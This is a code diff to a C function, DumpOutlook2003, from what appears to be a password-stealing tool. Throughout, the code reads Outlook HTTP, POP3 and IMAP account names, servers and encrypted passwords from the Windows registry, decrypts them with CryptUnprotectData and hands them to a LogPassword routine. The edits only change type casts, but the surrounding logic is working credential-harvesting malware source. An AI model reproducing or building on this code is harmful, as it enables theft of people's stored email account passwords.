@@ -366,11 +366,11 @@ void DumpOutlook2003()
 
 		tmp_size = sizeof(data);
 		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"HTTP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"HTTP Server URL" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
@@ -378,7 +378,7 @@ void DumpOutlook2003()
 				dbin.cbData = tmp_size-1;
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
-					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
+					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)dbout.pbData);
 					LogPassword((WCHAR*)L"Outlook 2003/2010 HTTP", server, user, password);
 					LocalFree(dbout.pbData);
 				}
@@ -387,11 +387,11 @@ void DumpOutlook2003()
 
 		tmp_size = sizeof(data);
 		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"POP3 User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 
 			tmp_size = sizeof(data);
 			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
@@ -399,7 +399,7 @@ void DumpOutlook2003()
 				dbin.cbData = tmp_size-1;
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
-					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
+					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)dbout.pbData);
 					LogPassword((WCHAR *)L"Outlook 2003/2010 POP3", server, user, password);
 					LocalFree(dbout.pbData);
 				}
@@ -407,20 +407,20 @@ void DumpOutlook2003()
 		} 
 
 		tmp_size = sizeof(data);
-		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCTSTR)"IMAP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+		if(FNC(RegQueryValueExA) ( hkeyresult, (LPCSTR)"IMAP User" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+			_snwprintf_s(user, sizeof(user)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR) data);
 
 			tmp_size = sizeof(data);
-			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
-				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", data);
+			if(FNC(RegQueryValueExA) ( hkeyresult, (LPCSTR)"IMAP Server" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+				_snwprintf_s(server, sizeof(server)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)data);
 			}
 
 			tmp_size = sizeof(data);
-			if(FNC(RegQueryValueExA) ( hkeyresult, ( LPCTSTR )"IMAP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
+			if(FNC(RegQueryValueExA) ( hkeyresult, (LPCSTR) "IMAP Password" , 0, &type, data, &tmp_size ) == ERROR_SUCCESS) {
 				dbin.cbData = tmp_size-1;
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
-					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
+					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", (LPCWSTR)dbout.pbData);
 					LogPassword((WCHAR*)L"Outlook 2003/2010 IMAP", server, user, password);
 					LocalFree(dbout.pbData);
 				}
